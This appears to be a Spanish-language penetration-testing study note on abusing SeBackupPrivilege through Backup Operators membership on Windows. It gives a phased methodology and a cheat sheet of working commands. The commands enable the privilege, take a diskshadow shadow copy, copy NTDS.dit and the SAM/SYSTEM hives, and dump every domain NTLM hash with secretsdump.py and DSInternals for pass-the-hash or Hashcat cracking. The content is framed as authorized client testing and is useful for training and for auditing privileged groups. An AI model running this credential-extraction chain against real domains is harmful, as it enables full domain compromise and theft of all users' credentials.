---
tags:
  - windows
  - privex
  - SeBackupPrivilege
---
## Conceptos Clave (TL;DR)

- El grupo **Backup Operators** otorga los privilegios `SeBackupPrivilege` y `SeRestorePrivilege`, que permiten leer/escribir cualquier archivo o carpeta del sistema **ignorando la ACL/DACL** (no requiere ACE explícita a tu favor), siempre y cuando no exista un **Deny ACE explícito**.
- No se puede usar `copy`/`Get-Content` normales para abusar de este privilegio; hay que copiar el archivo de forma programática usando el flag `FILE_FLAG_BACKUP_SEMANTICS` (vía herramientas como `SeBackupPrivilegeCmdLets` o `robocopy /B`).
- En un **Domain Controller**, este privilegio permite copiar el `NTDS.dit` (base de datos de AD con todos los hashes NTLM del dominio) y las colmenas `SAM`/`SYSTEM`, lo que lleva a compromiso total del dominio (DCSync-like vía extracción offline).
- Como `NTDS.dit` está bloqueado en uso por el sistema, se debe crear una **Shadow Copy** (con `diskshadow`) para acceder a una copia "congelada" del archivo y poder extraerlo.
- Este y otros grupos integrados (Event Log Readers, DnsAdmins, Hyper-V Administrators, Print Operators, Server Operators) deben revisarse siempre como parte de la metodología de enumeración de privilegios en AD, documentando membresías excesivas en el reporte final.

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| `whoami /priv` y `whoami /groups` | Enumerar privilegios y grupos del usuario actual. |
| `SeBackupPrivilegeUtils.dll` / `SeBackupPrivilegeCmdLets.dll` | Módulos de PowerShell para habilitar y explotar `SeBackupPrivilege` (cmdlets `Get-SeBackupPrivilege`, `Set-SeBackupPrivilege`, `Copy-FileSeBackupPrivilege`). |
| `diskshadow.exe` | Utilidad nativa de Windows para crear shadow copies y exponerlas como una unidad accesible (bypass del bloqueo de archivos en uso, ej. NTDS.dit). |
| `robocopy /B` | Alternativa nativa (sin DLLs externas) para copiar archivos en "modo backup", respetando `SeBackupPrivilege`. |
| `reg save` | Exportar localmente las colmenas de registro SAM y SYSTEM. |
| `secretsdump.py` (Impacket) | Extraer hashes NTLM offline a partir de `ntds.dit` + `SYSTEM`, o de `SAM` + `SYSTEM`. |
| `DSInternals` (módulo PowerShell, `DSInternals.psd1`) | Extraer cuentas/credenciales específicas de un `ntds.dit` offline (`Get-BootKey`, `Get-ADDBAccount`). |
| `Hashcat` | Crackeo offline de los hashes NTLM extraídos. |

## Metodología Paso a Paso

### Fase 1 - Enumeración de privilegios
Tras obtener acceso a una máquina, confirmar pertenencia al grupo Backup Operators y el estado del privilegio.

### Fase 2 - Habilitación del privilegio
Por defecto `SeBackupPrivilege` aparece como "Disabled" aunque el usuario sea miembro del grupo; hay que activarlo explícitamente en la sesión actual antes de poder usarlo.

### Fase 3 - Explotación en host local (archivo protegido)
Usar el cmdlet de copia con soporte de backup semantics para extraer cualquier archivo protegido sin tener ACE propia, demostrando el impacto (ej. archivos confidenciales).

### Fase 4 - Escalada en Domain Controller (NTDS.dit)
1. Crear una shadow copy del volumen C: con `diskshadow` y exponerla como una nueva letra de unidad (ej. E:), ya que el `NTDS.dit` real está en uso y bloqueado.
2. Copiar el `NTDS.dit` desde la shadow copy (ya no está "en uso") usando `Copy-FileSeBackupPrivilege` o `robocopy /B` (este último sin necesidad de DLLs externas).
3. (Opcional, alternativa local) Exportar las colmenas `SAM` y `SYSTEM` con `reg save` para extraer credenciales de cuentas locales.

### Fase 5 - Extracción de credenciales offline
- Con `secretsdump.py` usando `ntds.dit` + `SYSTEM` (modo `LOCAL`) se obtienen todos los hashes NTLM del dominio.
- Con el módulo `DSInternals` se puede extraer de forma selectiva una cuenta específica (ej. Administrator) calculando primero el bootKey desde el `SYSTEM` hive.

### Fase 6 - Post-explotación
Usar los hashes NTLM extraídos para Pass-the-Hash o crackeo offline con Hashcat, y documentar estadísticas de fortaleza de contraseñas para el informe del cliente.

## Cheat Sheet de Comandos

```powershell
# Enumerar grupos del usuario actual
whoami /groups

# Enumerar privilegios actuales y su estado (Enabled/Disabled)
whoami /priv

# Importar los módulos necesarios para abusar de SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Verificar si SeBackupPrivilege está habilitado
Get-SeBackupPrivilege

# Habilitar SeBackupPrivilege en la sesión actual
Set-SeBackupPrivilege

# Copiar un archivo protegido (sin ACE propia) aprovechando el privilegio
Copy-FileSeBackupPrivilege 'C:\<RUTA_PROTEGIDA>\<ARCHIVO>' .\<ARCHIVO_DESTINO>
```

```text
# Sesión interactiva de diskshadow para crear una shadow copy del volumen C: y exponerla como E:
diskshadow.exe

# Dentro de la consola DISKSHADOW (modo interactivo):
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

```powershell
# Copiar el NTDS.dit desde la shadow copy (E:) usando el cmdlet de backup privilege
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\<RUTA_DESTINO>\ntds.dit
```

```cmd
:: Alternativa nativa sin DLLs externas: copiar NTDS.dit con robocopy en modo backup
:: /B = modo backup (usa SeBackupPrivilege/SeRestorePrivilege)
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

:: Exportar localmente las colmenas SAM y SYSTEM para extraer credenciales offline
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

```powershell
# Importar el módulo DSInternals para análisis offline del NTDS.dit
Import-Module .\DSInternals.psd1

# Calcular el bootKey a partir del hive SYSTEM exportado
$key = Get-BootKey -SystemHivePath .\SYSTEM

# Extraer una cuenta específica (ej. Administrator) del ntds.dit usando el bootKey
Get-ADDBAccount -DistinguishedName 'CN=<USER>,CN=users,DC=<DOMAIN>,DC=<TLD>' -DBPath .\ntds.dit -BootKey $key
```

```bash
# Extraer TODOS los hashes NTLM del dominio offline desde ntds.dit + SYSTEM
# -ntds : ruta al archivo ntds.dit extraído
# -system : ruta al hive SYSTEM exportado (necesario para el bootKey)
# -hashes lmhash:nthash : formato de salida de hashes (placeholder, normalmente se omite o se usa para PtH)
# LOCAL : modo de extracción offline (no contra un DC en vivo)
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Alternativa: extraer credenciales locales (SAM) offline
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

## "Gotchas" y Troubleshooting

- Ser miembro de **Backup Operators** NO implica que `SeBackupPrivilege` esté habilitado por defecto en la sesión: siempre aparece como `Disabled` en `whoami /priv` hasta que se activa manualmente (`Set-SeBackupPrivilege`).
- Según la configuración del servidor (UAC), puede ser necesario abrir una **consola CMD/PowerShell elevada** para poder habilitar el privilegio correctamente.
- Un **Deny ACE explícito** sobre un archivo/carpeta para el usuario o uno de sus grupos **bloquea el acceso incluso con `FILE_FLAG_BACKUP_SEMANTICS`**; SeBackupPrivilege no sobrescribe denegaciones explícitas.
- `NTDS.dit` está siempre bloqueado/en uso en un DC en funcionamiento: NO se puede copiar directamente sin antes crear una **shadow copy** con `diskshadow`.
- `robocopy /B` es una alternativa 100% nativa (no requiere subir DLLs externas como `SeBackupPrivilegeUtils.dll`), útil cuando hay restricciones para subir herramientas al objetivo.
- Pertenencia a este grupo también permite **inicio de sesión local en el Domain Controller**, lo que facilita todo el flujo de ataque descrito.
- Tras extraer `ntds.dit`, recordar que también se necesita el hive `SYSTEM` (para el bootKey) tanto para `secretsdump.py` como para `DSInternals`; uno sin el otro no es suficiente.
- Durante la fase de reporting, listar y adjuntar como apéndice los miembros de TODOS los grupos privilegiados built-in (Backup Operators, Event Log Readers, DnsAdmins, Hyper-V Administrators, Print Operators, Server Operators) para que el cliente valide si el acceso sigue siendo necesario.